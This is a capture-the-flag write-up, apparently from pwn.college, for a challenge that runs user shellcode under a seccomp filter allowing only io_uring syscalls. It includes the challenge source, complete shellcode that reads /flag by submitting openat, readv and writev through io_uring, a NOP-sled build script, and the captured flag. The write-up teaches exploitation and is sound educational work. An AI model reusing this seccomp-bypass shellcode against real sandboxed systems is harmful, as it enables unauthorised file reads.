# Day 05

Attachment:

```c
#include <errno.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>

#define NORTH_POLE_ADDR (void *)0x1225000

int setup_sandbox()
{
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl(NO_NEW_PRIVS)");
        return 1;
    }

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (!ctx) {
        perror("seccomp_init");
        return 1;
    }

    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_setup), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_enter), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_register), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0) < 0) {
        perror("seccomp_rule_add");
        return 1;
    }

    if (seccomp_load(ctx) < 0) {
        perror("seccomp_load");
        return 1;
    }

    seccomp_release(ctx);

    return 0;
}

int main()
{
    void *code = mmap(NORTH_POLE_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (code != NORTH_POLE_ADDR) {
        perror("mmap");
        return 1;
    }

    srand(time(NULL));
    int offset = (rand() % 100) + 1;

    puts("🛷 Loading cargo: please stow your sled at the front.");

    if (read(STDIN_FILENO, code, 0x1000) < 0) {
        perror("read");
        return 1;
    }

    puts("📜 Checking Santa's naughty list... twice!");
    if (setup_sandbox() != 0) {
        perror("setup_sandbox");
        return 1;
    }

    // puts("❄️ Dashing through the snow!");
    ((void (*)())(code + offset))();

    // puts("🎅 Merry Christmas to all, and to all a good night!");
    return 0;
}
```

We can execute arbitrary shellcode, but limited to use `io_uring` syscalls. Therefore, we need to use io_uring to do `openat + readv + writev` syscalls. Because we cannot use `mmap`, we must use `IORING_SETUP_NO_MMAP` to provide buffers to the kernel. To simplify the logic further, we use `IORING_SETUP_NOSQARRAY` to remove extra layer of indirection. Then, for each syscall:

1. allocate buffer on stack, initialize sqe array and sq/cq ring structure
2. add the syscall information as sqe
3. use `io_uring_setup` to create an io_uring fd
4. use `io_uring_enter` to do the actual job
5. poll cq.tail to wait for completion

Attack code:

```c
#include <fcntl.h>
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <unistd.h>

void test() {
  // reuse address on stack
  unsigned long long rsp_value;
  asm volatile("mov %%rsp, %0" : "=r"(rsp_value));
  rsp_value -= rsp_value % 4096;

  // buffer for storing flag
  struct iovec iovecs[1];
  char buffer[256];
  iovecs[0].iov_base = buffer;
  iovecs[0].iov_len = sizeof(buffer);

  for (int n = 0; n < 3; n++) {
    // follow
    // https://github.com/shuveb/io_uring-by-example/blob/master/02_cat_uring/main.c
    struct io_uring_params p;
    for (int i = 0; i < sizeof(p); i++) {
      *(((char *)&p) + i) = 0;
    }
    p.flags = IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;

    // this is the sqe array
    rsp_value -= 4096;
    struct io_uring_sqe *sqe = (struct io_uring_sqe *)rsp_value;
    for (int i = 0; i < sizeof(struct io_uring_sqe); i++) {
      *(((char *)sqe) + i) = 0;
    }

    // three syscalls:
    // 1. openat(AT_FWCWD, "/flag", O_RDONLY)
    // 2. readv() from opened flag
    // 3. writev() to stdout
    if (n == 0) {
      // openat(AT_FWCWD, "/flag", O_RDONLY) = 4
      sqe[0].opcode = IORING_OP_OPENAT;
      char flag[] = "/flag";
      sqe[0].addr = (__u64)flag;
      sqe[0].fd = AT_FDCWD;
      sqe[0].open_flags = O_RDONLY;
    } else if (n == 1) {
      // readv(4, iovec)
      sqe[0].fd = 4;
      sqe[0].opcode = IORING_OP_READV;
      sqe[0].addr = (__u64)&iovecs[0];
      sqe[0].len = 1;
    } else if (n == 2) {
      // writev(1, iovec)
      sqe[0].fd = 1;
      sqe[0].opcode = IORING_OP_WRITEV;
      sqe[0].addr = (__u64)&iovecs[0];
      sqe[0].len = 1;
    }

    p.sq_off.user_addr = rsp_value;

    // this is the sq/cq ring
    rsp_value -= 4096;
    volatile unsigned *ring = (volatile unsigned *)rsp_value;
    p.cq_off.user_addr = rsp_value;

    // setup io_uring
    int ring_fd = 0;
    if (1) {
      register int rax __asm__("rax") = SYS_io_uring_setup;
      // arguments
      register int rdi __asm__("rdi") = 10;
      register const void *rsi __asm__("rsi") = &p;
      __asm__ volatile("syscall\n"     // Execute system call
                       : "=a"(ring_fd) // Output: result in rax
                       :
                       : "rcx", "r11",
                         "memory" // Clobbered registers
      );
    }

    // submit
    // update sq tail
    ring[1] = 1;
    register int rax __asm__("rax") = SYS_io_uring_enter;
    // arguments
    register int rdi __asm__("rdi") = ring_fd;
    register int rsi __asm__("rsi") = 1; // to_submit
    register int rdx __asm__("rdx") = 1; // min_complete
    register int r10 __asm__("r10") = IORING_ENTER_GETEVENTS;
    register int r8 __asm__("r8") = 0;
    register int r9 __asm__("r9") = 0;
    int ret;
    __asm__ volatile("syscall\n" // Execute system call
                     : "=a"(ret) // Output: result in rax
                     :
                     : "rcx", "r11",
                       "memory" // Clobbered registers
    );

    // wait in cq
    while (1) {
      unsigned tail = ring[3];
      if (tail == 1) {
        break;
      }
    }
  }
}
```

Compile to bytecode:

```python
import os
os.system("gcc test.c -o test.o -ffreestanding -nostdlib && objcopy -O binary -j .text test.o test.bin && objdump -m i386 -M amd64 -D -b binary test.bin")

bytecode = open("test.bin", "rb").read()
bytecode = b"\x90" * 100 + bytecode # handle the random offset
open("bytecode.bin", "wb").write(bytecode)
```

Profit:

```shell
$ /challenge/sleigh < bytecode.bin
🛷 Loading cargo: please stow your sled at the front.
📜 Checking Santa's naughty list... twice!
pwn.college{AsRiadTljnFPtoRvjiXDqors0K6.0FOwkTMywyM5EzN0EzW}
```

Some debugging tips:

1. `strace` to see `io_uring` invocations
2. `sudo perf record -e "io_uring:*" -- ./sleigh` and `sudo perf script -i perf.data` to see the result of each io_uring submitted syscall
